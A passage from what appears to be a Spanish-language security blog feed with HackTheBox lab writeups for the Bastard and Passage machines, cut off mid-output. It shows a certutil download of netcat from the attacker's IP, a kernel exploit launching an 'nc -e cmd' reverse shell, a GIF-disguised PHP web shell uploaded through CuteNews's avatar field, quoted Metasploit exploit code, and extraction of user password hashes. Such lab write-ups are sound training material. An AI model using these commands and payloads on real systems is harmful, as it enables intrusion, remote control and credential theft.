 doexec.c   generic.h   getopt.c   getopt.h   hobbit.txt   license.txt   Makefile   nc.exe   nc64.exe   netcat.c   readme.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;certutil.exe -f -urlcache -split http://10.10.16.3/nc64.exe nc64.exe
****  Online  ****
  0000  ...
  b0d8
CertUtil: -URLCache command completed successfully.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez subido el ejecutable, vamos a ejecutarlo de manera privilegiada usando el &lt;code&gt;exploit&lt;/code&gt; y asi obtener una consola interactiva.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;    Directory: C:\Windows\Temp\Priv


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         29/4/2023   7:04 ??      55296 ms15-051x64.exe                   
-a---         29/4/2023   7:15 ??      45272 nc64.exe                          


.\ms15-051x64.exe &quot;C:\Windows\Temp\Priv\nc64.exe -e cmd 10.10.16.3 443&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos y recibimos la conexión como &lt;code&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49361.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
nt authority\system

C:\Windows\Temp\Priv&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente nos dirigimos al directorio personal del usuario &lt;code&gt;administrator&lt;/code&gt; y visualizamos la segunda flag &lt;code&gt;root.txt&lt;/code&gt; 😏.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of C:\Users\Administrator\Desktop

08/02/2022  05:50     &amp;lt;DIR&amp;gt;          .
08/02/2022  05:50     &amp;lt;DIR&amp;gt;          ..
19/03/2017  08:34                 32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   4.134.981.632 bytes free

type root.txt
type root.txt
4bf12b963da1b30cc93496f617f7ba7c
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Fri, 28 Apr 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Bastard</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Bastard</guid>
        
        <category>Drupal Enumeration</category>
        
        <category>Drupal sql RCE</category>
        
        <category>Drupalgeddon2</category>
        
        <category>Drupalgeddon3</category>
        
        <category>Remote Code Execution Drupal</category>
        
        <category>Sherlock Enumeration</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Passage - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina Passage de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Linux&lt;/code&gt; de dificultad &lt;code&gt;Media&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad de &lt;code&gt;Cute News&lt;/code&gt; con la que obtendremos ejecución remota de comandos, despues haremos un analisis de codigo de un repositorio publico en github para descubrir ciertos recursos y finalmente para escalar privilegios como el usuario &lt;code&gt;root&lt;/code&gt; nos aprovecharemos de &lt;code&gt;USBCreator&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Passage
❯ ls
 Passage
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.206
PING 10.10.10.206 (10.10.10.206) 56(84) bytes of data.
64 bytes from 10.10.10.206: icmp_seq=1 ttl=63 time=210 ms

--- 10.10.10.206 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 210.072/210.072/210.072/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde con un &lt;code&gt;ttl&lt;/code&gt; de &lt;code&gt;63&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemoscon el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.206 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-17 16:25 GMT
Initiating SYN Stealth Scan at 16:25
Scanning 10.10.10.206 [65535 ports]
Discovered open port 22/tcp on 10.10.10.206
Discovered open port 80/tcp on 10.10.10.206
Completed SYN Stealth Scan at 16:25, 16.83s elapsed (65535 total ports)
Nmap scan report for 10.10.10.206
Host is up, received user-set (0.12s latency).
Scanned at 2023-04-17 16:25:13 GMT for 17s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.00 seconds
           Raw packets sent: 82801 (3.643MB) | Rcvd: 82648 (3.306MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de realizarse el escaneo vemos que los puertos abiertos corresponden a  &lt;code&gt;22 ssh&lt;/code&gt; , &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.206 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-17 16:27 GMT
Nmap scan report for 10.10.10.206
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Passage News
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.80 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos la versión de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.2p2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.18&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Primeramente ya que &lt;code&gt;nmap&lt;/code&gt; nos reporto que el puerto &lt;code&gt;80&lt;/code&gt; se encuentra abiertos usaremos &lt;code&gt;whatweb&lt;/code&gt; para tratar identificar a que nos estamos enfrentando y ver el gestor de contenido web desde consola.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.206
http://10.10.10.206 [200 OK] Apache[2.4.18], Bootstrap, Cookies[CUTENEWS_SESSION], Country[RESERVED][ZZ], Email[kim@example.com,nadav@passage.htb,paul@passage.htb,sid@example.com], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.206], JQuery, PoweredBy[CuteNews:], Script[text/javascript], Title[Passage News]
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cutenews: CuteNews es un gestor de noticias/sistema de publicación blog, creado por el equipo de desarrolladores de CutePHP&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;La herramienta nos reporta que se esta usando el gestor de contenido correspondiente a &lt;code&gt;Cutenews&lt;/code&gt;, ademas vemos que se puede estar aplicando virtual hosting. Por lo que procederemos a agregar el dominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.206 passage.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a proceder a abrir el servicio web en el navegador&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A primera vista no vemos algo muy relevante asi que probaremos a ver el codigo fuente de la pagina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Visualizamos que existe una ruta de nombre &lt;code&gt;CuteNews&lt;/code&gt; y tenemos capacidad de acceso a la ruta que concretamente se trata de un panel de login.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Encontramos algo muy interesante en el panel de login ya que podemos ver la versión de &lt;code&gt;CuteNews&lt;/code&gt; que se esta utilizando.&lt;/p&gt;

&lt;p&gt;Verificamos si hay algun exploit publico &lt;code&gt;searchsploit&lt;/code&gt; y efectivamente existen vulnerabilidades asociadas a esta versión especifica &lt;code&gt;2.1.2&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit cutenews 2.1.2
------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                           | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                                                                               | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                   | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                                                                                 | php/webapps/48800.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tenemos exploits que corresponden a &lt;code&gt;RCE&lt;/code&gt;, el primero de ellos nos habla de algo asociado con &lt;code&gt;avatar&lt;/code&gt;, podemos investigar de que trata el exploit trayendonoslo a nuestro directorio. Pero primero recordemos que en el panel de login, existia la opción de registrar un nuevo usuario.&lt;/p&gt;

&lt;p&gt;Procedamos a registrarnos en el servicio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez registrados, obervamos en nuestro panel un campo correspondiente a &lt;code&gt;avatar&lt;/code&gt;, y si recordamos antes vimos un &lt;code&gt;exploit&lt;/code&gt; asociado que justamente nos hablaba de algo de &lt;code&gt;avatar&lt;/code&gt;. Quiero pensar entonces que al este campo corrsponder a una subida de archivos, entonces la &lt;code&gt;RCE&lt;/code&gt; en el exploit la obtiene de un mal control en la subida de archivos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para estar seguros podemos examinar el exploit y ver que que trata.&lt;/p&gt;

&lt;p&gt;Efectivamente dentro encontramos una función que lo que hace es realizar una petición en &lt;code&gt;avatar&lt;/code&gt; subiendo un arhivo &lt;code&gt;php&lt;/code&gt; que incluye una cabecera &lt;code&gt;GIF&lt;/code&gt; y de Content-Type &lt;code&gt;image/png&lt;/code&gt;: esto para mediante el uso de &lt;code&gt;Magic Numbers&lt;/code&gt; hacer un &lt;code&gt;bypass&lt;/code&gt; aprovechando la mala sanitización en el campo de subida y este nos detecte el archivo como un &lt;code&gt;GIF&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-ruby&quot;&gt;def upload_shell(cookie, check)

    res = send_request_cgi({
      'method'   =&amp;gt; 'GET',
      'uri'      =&amp;gt; normalize_uri(target_uri.path, &quot;index.php?mod=main&amp;amp;opt=personal&quot;),
      'cookie'   =&amp;gt; cookie
    })

    signkey = res.body.split('__signature_key&quot; value=&quot;')[1].split('&quot;')[0]
    signdsi = res.body.split('__signature_dsi&quot; value=&quot;')[1].split('&quot;')[0]
    # data preparation
    fname = Rex::Text.rand_text_alpha_lower(8) + &quot;.php&quot;
    @shell = &quot;#{fname}&quot;
    pdata = Rex::MIME::Message.new
    pdata.add_part('main', nil, nil, 'form-data; name=&quot;mod&quot;')
    pdata.add_part('personal', nil, nil, 'form-data; name=&quot;opt&quot;')
    pdata.add_part(&quot;#{signkey}&quot;, nil, nil, 'form-data; name=&quot;__signature_key&quot;')
    pdata.add_part(&quot;#{signdsi}&quot;, nil, nil, 'form-data; name=&quot;__signature_dsi&quot;')
    pdata.add_part('', nil, nil, 'form-data; name=&quot;editpassword&quot;')
    pdata.add_part('', nil, nil, 'form-data; name=&quot;confirmpassword&quot;')
    pdata.add_part(&quot;#{datastore['USERNAME']}&quot;, nil, nil, 'form-data; name=&quot;editnickname&quot;')
    pdata.add_part(&quot;GIF\r\n&quot; + payload.encoded, 'image/png', nil, &quot;form-data; name=\&quot;avatar_file\&quot;; filename=\&quot;#{fname}\&quot;&quot;)
    pdata.add_part('', nil, nil, 'form-data; name=&quot;more[site]&quot;')
    pdata.add_part('', nil, nil, 'form-data; name=&quot;more[about]&quot;')
    data = pdata.to_s
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Puedes ver este articulo, para comprender a mayor detalle el uso de &lt;code&gt;Magic Numbers&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot;&gt;https://en.wikipedia.org/wiki/List_of_file_signatures&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Como ya sabemos en que consiste la vulnerabilidad, en vez de hacer uso del exploit. Crearemos un archivo &lt;code&gt;php&lt;/code&gt; con esas caracteristicas, que nos permita la ejecución de comandos mediante el uso de un parametro definido &lt;code&gt;cmd&lt;/code&gt; en conjunto con la función &lt;code&gt;shell_exec&lt;/code&gt;. Seguidamente subiremos el archivo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;❯ cat cmd.php
GIF8;

&amp;lt;?php
    echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El archivo se sube correctamente y consecuentemente inspeccionamos la ruta en donde se encuentra nuestro archivo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a la ruta indicada de nombre &lt;code&gt;uploads&lt;/code&gt; y si vemos nuestro archivo subido.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Verificamos que podemos ejecutar comandos y estamos como &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo que sigue sera mandarnos una &lt;code&gt;reverse shell&lt;/code&gt; a nuestra maquina haciendo uso &lt;code&gt;bash&lt;/code&gt; y poniendonos en escucha con &lt;code&gt;ncat&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Recordatorio no olvidar urlencodear el caracter &lt;code&gt;&amp;amp;&lt;/code&gt; a &lt;code&gt;%26&lt;/code&gt; para evitar problemas al procesarse la petición.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Enviamos la petición&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y recibimos la conexión como el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.206.
Ncat: Connection from 10.10.10.206:43080.
bash: cannot set terminal process group (1683): Inappropriate ioctl for device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ whoami
whoami
www-data
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como es de costumbre, vamos a obtener una &lt;code&gt;tty&lt;/code&gt; full interactiva con los comandos de siempre.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@passage:/var/www/html/CuteNews/uploads$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@passage:/var/www/html/CuteNews/uploads$ export TERM=xterm
www-data@passage:/var/www/html/CuteNews/uploads$ export SHELL=bash
www-data@passage:/var/www/html/CuteNews/uploads$ stty rows 45 columns 174
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cabe recordar que el numero de &lt;code&gt;rows&lt;/code&gt; y &lt;code&gt;columns&lt;/code&gt; corresponden a las dimensiones de tu pantalla y puedes verificar haciendo uso del comando &lt;code&gt;stty size&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Existe un repositorio de &lt;code&gt;CuteNews&lt;/code&gt; publico en github:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/CuteNews/cutenews-2.0&quot;&gt;https://github.com/CuteNews/cutenews-2.0&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Aqui nos habla que para agregar comentarios, perfiles o cualquier información, no necesita hacer uso de un gestor de base de datos como &lt;code&gt;mysql&lt;/code&gt;. Revisando el repositorio podemos ver que la data lo almacena en un directorio de nombre &lt;code&gt;cdata&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata$ ls 
Default.tpl	    backup	 category.db.php  confirmations.php  idnews.db.php   news	 postponed_news.txt  template		  users.txt
Headlines.tpl	    btree	 comments.txt	  csrf.php	     installed.mark  news.txt	 replaces.php	     unapproved_news.txt
archives	    cache	 conf.php	  flood.db.php       ipban.db.php    newsid.txt  rss.tpl	     users
auto_archive.db.php  cat.num.php  config.php	  flood.txt	     log	     plugins	 rss_config.php      users.db.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro de este directorio en el directorio &lt;code&gt;users&lt;/code&gt;, almacena los datos de los usuarios registrados en un archivo cuyo nombre se computa al tomar los dos primeros caracteres del &lt;code&gt;usuario&lt;/code&gt; en &lt;code&gt;md5&lt;/code&gt; y le agrega la extensión &lt;code&gt;php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Como yo cree el usuario &lt;code&gt;fmiracle&lt;/code&gt;, los primeros caracteres corresponderian a &lt;code&gt;cb&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo -n &quot;fmiracle&quot; | md5sum
cb151a66aabded3ee89f616afab7b6c9
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que si existe un archivo &lt;code&gt;cb.php&lt;/code&gt; en el directorio asi que procedemos a leerlo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ cat cb.php 
&amp;lt;?php die('Direct call - access denied'); ?&amp;gt;
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmYWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtaXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-d
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que el formato esta en &lt;code&gt;base64&lt;/code&gt; usaremos un &lt;code&gt;base64 -d&lt;/code&gt; para decodificarla y vemos el &lt;code&gt;hash&lt;/code&gt; correspondiente a la contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ echo &quot;YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUi3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-data@passage&quot; | base64 -d; echo

a:1:{s:4:&quot;name&quot;;a:1:{s:8:&quot;fmiracle&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1681750802&quot;;s:4:&quot;name&quot;;s:8:&quot;fmiracle&quot;;s:3:&quot;acl&quot;;s:1:&quot;4&quot;;s:5:&quot;email&quot;;s:21:&quot;fmiracle@fmiracle.com&quot;;s:4:&quot;nick&quot;;s:8:&quot;fmiracle&quot;;s:4:&quot;pass&quot;;s:64:&quot;48b841bea205fdb2d60140a89c8b300618faca200d26bd2cd4bd2c0f59818383&quot;;s:4:&quot;more&quot;;s:60:&quot;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&quot;;s:6:&quot;avatar&quot;;s:23:&quot;avatar_fmiracle_cmd.php&quot;;s:6:&quot;e-hide&quot;;s:0:&quot;&quot;;}}}
                                          base64: invalid input
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a realizar el mismo proceso para todos los archivos y visualizaremos los hashes correspondientes a los usuarios registrados.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ cat * | grep -v &quot;denied&quot; | base64 -d; echo
a:1:{s:5:&quot;email&quot;;a:1:{s:16:&quot;paul@passage.htb&quot;;s:10:&quot;paul-coles&quot;;}}a:1:{s:2:&quot;id&quot;;a:1:{i:1598829833;s:6:&quot;egre55&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;egre55@test.com&quot;;s:6:&quot;egre55&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:5:&quot;admin&quot;;a:8:{s:2:&quot;id&quot;;s:10:&quot;1592483047&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;acl&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:17:&quot;nadav@passage.htb&quot;;s:4:&quot;pass&quot;;s:64:&quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592487988&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483281;s:9:&quot;sid-meier&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:17:&quot;nadav@passage.htb&quot;;s:5:&quot;admin&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;kim@example.com&quot;;s:9:&quot;kim-swift&quot;;}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483236;s:10:&quot;paul-coles&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:9:&quot;sid-meier&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483281&quot;;s